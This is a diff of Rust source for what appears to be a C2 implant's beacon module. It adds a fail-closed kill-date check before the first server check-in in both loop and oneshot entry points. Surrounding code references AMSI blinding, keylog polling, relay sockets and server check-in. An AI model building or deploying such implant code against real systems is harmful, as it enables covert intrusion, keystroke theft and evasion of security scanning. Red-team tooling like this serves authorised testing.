@@ -205,6 +205,21 @@ unsafe fn beacon_checkin(
 
 // ── Per-cycle helpers ───────────────────────────────────────────────────────
 
+/// Kill-date check (fail-closed — implant-beacon-4). Returns true when the
+/// implant has expired and must stop. `now_unix()` returns 0 only when the
+/// clock export cannot be resolved; a kill-switch must NOT fail open because
+/// the clock API is unavailable, so 0 is treated as expired (the hostinfo
+/// "0 = unknown, do not enforce" contract is deliberately overridden HERE —
+/// expiry is the one control that must fail closed). No-op when no kill-date
+/// is configured (`expires_at == 0`).
+fn kill_date_reached(implant: &ImplantConfig) -> bool {
+    if implant.expires_at == 0 {
+        return false;
+    }
+    let now = crate::hostinfo::now_unix();
+    now == 0 || now >= implant.expires_at
+}
+
 /// Enforce kill-date, retry AMSI blinding, sleep, pump messages, poll keylog,
 /// drain relay sockets. Returns true if the beacon should continue.
 fn beacon_cycle_setup(
@@ -214,12 +229,10 @@ fn beacon_cycle_setup(
     cfg: &Config,
     pending: &mut Vec<TaskResponse>,
 ) -> bool {
-    // Kill-date enforcement.
-    if implant.expires_at != 0 {
-        let now = crate::hostinfo::now_unix();
-        if now != 0 && now >= implant.expires_at {
-            return false;
-        }
+    // Kill-date enforcement (fail-closed: an unreadable clock counts as
+    // expired rather than disabling the kill switch).
+    if kill_date_reached(implant) {
+        return false;
     }
     // Retry AMSI blinding: capped at 10 cycles.
     if EVASION_ACTIVE.load(core::sync::atomic::Ordering::Acquire)
@@ -386,6 +399,14 @@ pub unsafe fn beacon_loop() -> u32 {
     };
     let BeaconInit { cfg, implant, key, pubkey, info_plain, rt, ch_ctx, .. } = init;
 
+    // Kill-date fail-closed BEFORE the first check-in (implant-beacon-4): the
+    // old check ran only after the check-in round-trip, so an expired implant
+    // still phoned home and registered server-side. An expired beacon stops
+    // now, before any traffic.
+    if kill_date_reached(&implant) {
+        return 0x00;
+    }
+
     // Check-in retry.
     let mut counter = beacon_checkin(&pubkey, &key, &info_plain, &cfg, &ch_ctx);
 
@@ -421,6 +442,8 @@ pub unsafe fn beacon_loop() -> u32 {
 /// Exit codes:
 ///   1 = check-in succeeded (SessionInfo accepted by the server)
 ///       its response POSTed back (full round-trip)
+///   0x00 = kill-date reached — deliberate stop before check-in (fail-closed
+///       expiry, implant-beacon-4)
 ///   0xC0..0xCF = a specific step failed (see inline comments)
 #[allow(unused_assignments)]
 pub unsafe fn beacon_oneshot() -> u32 {
@@ -433,6 +456,12 @@ pub unsafe fn beacon_oneshot() -> u32 {
             (c, ImplantConfig::default(), p)
         };
     crate::mem::register_owned(config_plain);
+    // Kill-date fail-closed (implant-beacon-4): the oneshot entry must not run
+    // past its expiry — mirrors beacon_loop's pre-check-in gate. Exit cleanly
+    // with the loop's deliberate-stop code.
+    if kill_date_reached(&implant) {
+        return 0x00;
+    }
     // DIAG step 1: config loaded OK
     crate::entry::diag_mark(b"b1_config");
 
